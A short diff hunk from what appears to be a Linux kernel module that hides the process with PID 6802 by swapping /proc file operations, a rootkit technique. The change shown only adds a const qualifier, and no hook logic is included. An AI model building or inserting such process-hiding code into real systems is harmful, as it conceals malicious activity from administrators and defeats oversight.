@@ -7,7 +7,7 @@
 #include <linux/fs.h>
 #include <linux/proc_fs.h>
 #define proc_pid_to_hide "6802"
-static struct file_operations *backup_fops;
+static const struct file_operations *backup_fops;
 static struct file_operations proc_fops;
 static struct inode *proc_inode;
 static char *proc_to_hide = proc_pid_to_hide;
